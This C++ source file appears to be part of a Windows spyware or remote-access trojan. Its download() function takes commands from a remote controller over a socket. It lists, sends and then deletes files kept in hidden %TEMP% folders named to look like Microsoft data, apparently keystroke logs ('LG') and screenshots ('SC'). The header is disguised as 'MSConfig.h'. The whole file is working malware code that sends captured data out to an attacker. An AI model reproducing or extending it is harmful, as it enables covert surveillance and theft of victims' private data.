#include "MSConfig.h"

void download(SOCKET& ConnectSocket)
{
     char command[1024], response[1024], temppath[1024], tbdl[1024];
     int res;
     string totr;
     HANDLE hw;
     WIN32_FIND_DATA fd;
     
     strcpy(command, "OK+");
     send(ConnectSocket, command, (int)strlen(command), 0);
     
     totr.clear();
     do
     {
                  res = recv(ConnectSocket, response, 1024, 0);
                  response[res] = '\0';
                  totr += response;
     } while (totr[totr.length() - 1] != '+');
     totr.erase(totr.length() - 1, 1);
     
     string mode = totr;
     
     if (mode == "3")
     {
              GetTempPath(1024, temppath);
              strcat(temppath, "Microsoft_9021784367548932\\LG\\*");
              hw = FindFirstFile(temppath, &fd);
              if (hw == INVALID_HANDLE_VALUE) return;
              int LGcount = -2;
              do
              {
                  LGcount ++;
              } while ((FindNextFile(hw, &fd) != 0));
     
              GetTempPath(1024, temppath);
              strcat(temppath, "Microsoft_9021784367548932\\SC\\*");
              hw = FindFirstFile(temppath, &fd);
              if (hw == INVALID_HANDLE_VALUE) return;
              int SCcount = -2;
              do
              {
                  SCcount ++;
              } while ((FindNextFile(hw, &fd) != 0));
              
              sprintf(command, "%d+", LGcount);
              send(ConnectSocket, command, (int)strlen(command), 0);
     
              totr.clear();
              do
              {
                           res = recv(ConnectSocket, response, 1024, 0);
                           response[res] = '\0';
                           totr += response;
              } while (totr[totr.length() - 1] != '+');
     
              sprintf(command, "%d+", SCcount);
              send(ConnectSocket, command, (int)strlen(command), 0);
     
              totr.clear();
              do
              {
                           res = recv(ConnectSocket, response, 1024, 0);
                           response[res] = '\0';
                           totr += response;
              } while (totr[totr.length() - 1] != '+');
              totr.erase(totr.length() - 1, 1);
              
              if (totr == "NO+") return;
              
              int limit;
              for (int j = 1 ; j < 3 ; j ++)
              {
                  GetTempPath(1024, temppath);
                  if (j == 1)
                  {
                        limit = LGcount;
                        strcat(temppath, "Microsoft_9021784367548932\\LG\\*");
                  }
                  else
                  {
                      limit = SCcount;
                      strcat(temppath, "Microsoft_9021784367548932\\SC\\*");
                  }
                  hw = FindFirstFile(temppath, &fd);
                  if (hw == INVALID_HANDLE_VALUE) return;
                  int i, del;
              
                  for (i = -1 ; i <= limit ; i ++)
                  {
                      if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
                      {
                                                strcpy(tbdl, temppath);
                                                strcpy(tbdl + strlen(tbdl) - 1, fd.cFileName);
                                                del = DeleteFile(tbdl);
                                                sprintf(command, "%d+", del);
                                                send(ConnectSocket, command, (int)strlen(command), 0);
                                                totr.clear();
                                                do
                                                {
                                                             res = recv(ConnectSocket, response, 1024, 0);
                                                             response[res] = '\0';
                                                             totr += response;
                                                } while (totr[totr.length() - 1] != '+');
                      }
                      FindNextFile(hw, &fd);
                  }
              }
              
              return;
              
     }
     
     GetTempPath(1024, temppath);
     if (mode == "1") strcat(temppath, "Microsoft_9021784367548932\\LG\\*");
     else if (mode == "2") strcat(temppath, "Microsoft_9021784367548932\\SC\\*");
     hw = FindFirstFile(temppath, &fd);
     if (hw == INVALID_HANDLE_VALUE) return;
     do
     {
         if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
         sprintf(command, "%s+", fd.cFileName);
         send(ConnectSocket, command, (int)strlen(command), 0);
         totr.clear();
         do
         {
                      res = recv(ConnectSocket, response, 1024, 0);
                      response[res] = '\0';
                      totr += response;
         } while (totr[totr.length() - 1] != '+');
     } while ((FindNextFile(hw, &fd) != 0));
     strcpy(command, "DN+");
     send(ConnectSocket, command, (int)strlen(command), 0);
     
     totr.clear();
     do
     {
                  res = recv(ConnectSocket, response, 1024, 0);
                  response[res] = '\0';
                  totr += response;
     } while (totr[totr.length() - 1] != '+');
     totr.erase(totr.length() - 1, 1);
     
     if (totr == "NO") return;
     char minmax[64];
     strcpy(minmax, totr.c_str());
     int min = atoi(strtok(minmax, "-"));
     int max = atoi(strtok(NULL, "-"));
     
     GetTempPath(1024, temppath);
     if (mode == "1")
     {
              strcat(temppath, "Microsoft_9021784367548932\\LG\\*");
              mode.clear();
              mode = "LG";
     }
     else if (mode == "2")
     {
          strcat(temppath, "Microsoft_9021784367548932\\SC\\*");
          mode.clear();
          mode = "SC";
     }

     hw = FindFirstFile(temppath, &fd);
     if (hw == INVALID_HANDLE_VALUE) return;
     int i = 1;
     do
     {
         if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
         if ((i >= min) && (i <= max))
         {
                transfer(ConnectSocket, fd.cFileName, NULL, fd.nFileSizeLow, mode);
                strcpy(tbdl, temppath);
                strcpy(tbdl + strlen(tbdl) - 1, fd.cFileName);
                DeleteFile(tbdl);
         }
         i ++;
     } while ((FindNextFile(hw, &fd) != 0));

     return;
}
